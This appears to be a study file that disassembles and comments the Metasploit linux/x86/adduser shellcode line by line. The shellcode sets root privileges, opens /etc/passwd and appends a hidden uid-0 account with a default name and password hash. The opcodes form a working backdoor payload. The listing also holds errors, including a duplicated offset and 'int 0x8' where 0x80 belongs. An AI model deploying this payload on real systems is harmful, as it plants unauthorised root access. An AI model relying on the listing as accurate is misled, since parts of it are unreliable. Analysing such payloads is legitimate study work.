; Filename: analyze_adduser_opcodes.asm
; Name of payload: adduser.rb

; Source: 

; /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.12.20/modules/payloads/singles/linux/x86/adduser.rb

; /usr/include/i386-linux-gnu/asm/unistd_32.h
;   #define __NR_open 5
;   #define __NR_setreuid 70

; /usr/include/asm-generic/fcntl.h file
;   #define O_WRONLY        00000001
;   #define O_NOCTTY        00000400        


global _start

section .text

_start:

    00000000  31C9              xor ecx,ecx                 ; zero ECX
    00000002  89CB              mov ebx,ecx                 ; zero EBX
    00000004  6A46              push byte +0x46             ; push 0x46 (70) on the stack
    00000006  58                pop eax                     ; pop 0x46 in EAX to prepare setreuid() system call
    00000007  CD80              int 0x80                    ; invoke setreuid() syscall
                                                            ; int setreuid(uid_t ruid, uid_t euid);
                                                            ; EAX gets 0x46 (setreuid() syscall), EBX gets 0x0 (sets real user id to 0 (root)), ECX gets 0x0 (sets effective user id to 0x0 (root))
                                                            ; EAX recieves return value of setreuid() (which should be 0x0 if call succeeded or -1 (0xffffffff) if call failed)

    00000009  6A05              push byte +0x5              ; push 0x5 on the stack
    0000000B  58                pop eax                     ; EAX gets 0x5 to prepare open() system call
    0000000C  31C9              xor ecx,ecx                 ; zero ECX
    0000000E  51                push ecx                    ; push 0x00000000 on the stack to assure a null terminated string
    0000000F  6873737764        push dword 0x64777373       ; push "/etc//passwd" on the stack
    00000014  682F2F7061        push dword 0x61702f2f
    00000019  682F657463        push dword 0x6374652f
    0000001E  89E3              mov ebx,esp                 ; move address of the top of the stack in EBX (which now points to "/etc//passwd")
    00000020  41                inc ecx                     ; increment ECX (0x00000001) for O_WRONLY
    00000021  B504              mov ch,0x4                  ; move 0x4 in CH (0x00000401) for O_WRONLY | O_NOCTTY
    00000023  CD80              int 0x80                    ; invoke open() syscall
                                                            ; int open(const char *pathname, int flags); / int open(const char *pathname, int flags, mode_t mode);
                                                            ; EAX gets 0x5 (open() syscall), EBX gets the address of null terminated "/etc//passwd" string, ECX gets 0x401 (O_WRONLY (0x001) | O_NOCTTY (0x400))
                                                            ; EAX recieves the return value of open() (which is the new file descriptor)

    00000025  93                xchg eax,ebx                ; EBX gets the new file descriptor, EAX gets the address stored in EBX
    00000026  E828000000        call dword 0x53             ; call address 0x53 and push address of next instruction on the stack
    
    0000002B  6D                insd                        ; the code section from 0x0000002b to...
    0000002C  657461            gs jz 0x90
    0000002F  7370              jnc 0xa1
    00000031  6C                insb
    00000032  6F                outsd
    00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
    0000003B  736A              jnc 0xa7
    0000003D  3470              xor al,0x70
    0000003F  3449              xor al,0x49
    00000041  52                push edx
    00000042  633A              arpl [edx],di
    00000044  303A              xor [edx],bh
    00000046  303A              xor [edx],bh
    00000048  3A2F              cmp ch,[edi]
    0000004A  3A2F              cmp ch,[edi]
    0000004C  62696E            bound ebp,[ecx+0x6e]
    0000004F  2F                das
    00000050  7368              jnc 0xba

    ;00000052  0A598B            or bl,[ecx-0x75]           ; ...0x00000052 is skipped (the opcodes represent the username (which by default is 'metasploit') and password ('which by default is 'metasploit') of the new user 
    
    00000053  59                pop ecx                     ; ECX gets the address of default username (metasploit) and password (metasploit)
    00000054  8B51FC            mov edx, [ecx - 0x4]        ; move 0x28 (size of the string) in EDX 
    00000057  6A04              push byte +0x4              ; push 0x4 on the stack
    00000050  58                pop eax                     ; EAX gets 0x4 
    0000005A  CD80              int 0x80                    ; invoke write() syscall
                                                            ; ssize_t write(int fd, const void *buf, size_t count);
                                                            ; EAX gets 0x4 (write() syscall), EBX gets new file descriptor, ECX gets address of default username (metasploit) and password (metasploit), EDX gets 0x28 (40) (size of the string)

    0000005C  6A01              push byte +0x1              ; push 0x1 on the stack
    0000005E  58                pop eax                     ; EAX gets 0x1
    0000005F  CD80              int 0x8                     ; invoke exit() syscall
                                                            ; void exit(int status);
                                                            ; EAX gets 0x1 (exit() syscall), EBX gets new file descriptor

